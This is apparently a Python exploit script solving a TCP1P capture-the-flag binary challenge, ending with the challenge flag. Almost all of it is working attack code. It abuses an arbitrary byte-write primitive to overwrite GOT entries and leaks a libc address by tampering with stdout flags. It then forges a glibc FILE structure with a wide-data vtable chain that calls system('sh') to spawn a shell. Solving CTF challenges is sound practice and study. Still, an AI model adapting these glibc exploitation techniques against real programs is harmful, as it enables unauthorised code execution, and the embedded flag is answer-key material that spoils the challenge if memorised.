#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian

from lianpwn import *
import sys

context.log_level = "debug"
context.arch = "amd64"
context.terminal = ["tmux", "sp", "-h", "-l", "120"]

LOCAL = 1
filename = "./chall"
if LOCAL:
    io = process(filename)
else:
    remote_service = "ctf.tcp1p.team:20011"
    remote_service = remote_service.strip().split(":")
    io = remote(remote_service[0], int(remote_service[1]))
elf = ELF(filename, checksec=False)
libc = ELF(elf.libc.path, checksec=False)


def ru(a, drop=False):
    return io.recvuntil(a, drop)


rl = lambda a=False: io.recvline(a)
rn = lambda x: io.recvn(x)
s = lambda x: io.send(x)
sl = lambda x: io.sendline(x)
sa = lambda a, b: io.sendafter(a, b)
sla = lambda a, b: io.sendlineafter(a, b)
ia = lambda: io.interactive()
dbg = lambda text=None: gdb.attach(io, text)
i2b = lambda c: str(c).encode()
u32_ex = lambda data: u32(data.ljust(4, b"\x00"))
u64_ex = lambda data: u64(data.ljust(8, b"\x00"))


def inverse_gray(gray):
    val = 0
    while gray:
        val ^= gray
        gray >>= 1
    return val


def compute_val(original_ptr_value, desired_ptr_value):
    original_byte = original_ptr_value & 0xFF
    desired_byte = desired_ptr_value & 0xFF
    t = original_byte ^ desired_byte
    val_byte = inverse_gray(t) & 0xFF
    return val_byte


def cmd(addr, target, ori=0):
    ru(b"address: ")
    sl(i2b(addr))
    ru(b"value: ")
    sl(i2b(compute_val(ori, target)))


while True:
    try:
        cmd(elf.got.exit, 0xD0, 0x70)
        cmd(0x404018, 0xB6, 0x30)
        cmd(0x404019, 0x11, 0x10)
        cmd(elf.got.exit, 0x80, 0xD0)

        test_byte0 = 0xD
        # test_byte0 = int(input("testbyte:"), 16)
        cmd(0x404020, 0x20, 0xE0)
        cmd(0x404021, ((test_byte0 - 7) << 4) | 0x5, (test_byte0 << 4) | 0xF)
        cmd(elf.got.exit, 0xD0, 0x80)

        sl(flat([0xFBAD1887, 0, 0, 0]) + p8(0))
        sl(p32(0xFBAD2087))

        data = ru(b"address: ")
        libc_base = u64_ex(data[-0x4C:][:8]) - 0x21B804
        lg("libc_base", libc_base)
        sl(i2b(0x4040C0))
        ru(b"value: ")
        sl(i2b(0xDEADBEEF))

        sl(p32(0xFBAD1887))

        _lock = libc_base + 0x21CA60
        evil_wdata_addr = 0x404100
        _IO_wfile_jumps = libc_base + 0x2170C0

        f1 = IO_FILE_plus_struct()
        f1.flags = u64_ex(b"  sh;")
        f1._lock = _lock
        f1._wide_data = evil_wdata_addr
        f1._mode = 1
        f1.vtable = _IO_wfile_jumps

        sl(bytes(f1))
        cmd(elf.got.exit, 0x80, 0xD0)

        def write_qword(addr, ori, target):
            for i in range(8):
                cmd(addr + i, (target >> (i * 8)) & 0xFF, (ori >> (i * 8)) & 0xFF)

        write_qword(evil_wdata_addr + 0x18, 0, 0)
        write_qword(evil_wdata_addr + 0x20, 0, 1)
        write_qword(evil_wdata_addr + 0x30, 0, 0)
        write_qword(evil_wdata_addr + 0xE0, 0, evil_wdata_addr + 0x100)
        write_qword(evil_wdata_addr + 0x100 + 0x68, 0, libc_base + libc.sym.system)

        write_qword(
            0x404020, libc_base + libc.sym.gets, libc_base + libc.sym._IO_flush_all
        )

        cmd(elf.got.exit, 0xD0, 0x80)

        ia()
    except:
        io.close()
        if LOCAL:
            io = process(filename)
        else:
            io = remote(remote_service[0], int(remote_service[1]))

# TCP1P{baby_www}
